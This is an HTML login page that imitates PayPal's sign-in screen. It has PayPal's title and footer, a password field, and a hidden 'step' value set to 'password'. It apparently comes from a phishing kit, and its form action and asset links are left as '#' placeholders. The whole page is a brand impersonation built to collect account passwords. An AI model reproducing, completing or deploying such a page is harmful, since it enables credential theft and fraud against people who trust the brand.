<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Log in to your PayPal account</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="#bootstrap.css">
  <link rel="stylesheet"  href="#test.css">               
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="#html5shiv.min.js"></script>
  <script src="#respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="#Untitled-1.png" type="#x-icon" />
  <link rel="shortcut icon" href="#Untitled-1.png" type="#x-icon" />

</head>

<body>
     <div class="login">
         <div class="logo">
             <img src="#logo.png">
             <div class="change">
                 <p></p><a href="#">change</a>
             </div>
         </div>
         <form action="#" method="post">

            <input type="hidden" name="step" value="password">

            <div class="user">
                 <input  type="password" placeholder="Password" name="password">
                 <div class="er"><p>Required</p></div>
                 <div class="er-img"><img src="#img-er.png"></div>
                 <p class="place">Email or mobile number</p>
             </div>

             <a href="#">Forgot password?</a>
             <button  name="submit" id="log" style="color:#fff;" class="btn btn-primary d-block">Log In</button>
             <div class="or">
                 <p>or</p>
             </div>
             <button type="button" class="btn btn-light">Sign Up</button>
         </form>
     </div>


     <footer>
        <div class="footer">
            <ul class="list-unstyled d-flex">
                <li>Contact Us</li>
                <li>Privacy</li>
                <li>Legal</li>
                <li>Worldwide</li>
            </ul>
        </div>
     </footer>

  <!-- template files js-->
  <script src="#jquery-3.5.1.min.js"></script>
  <script src="#bootstrap.min.js"></script>
  <script src="#test.js"></script>
</body>
</html>
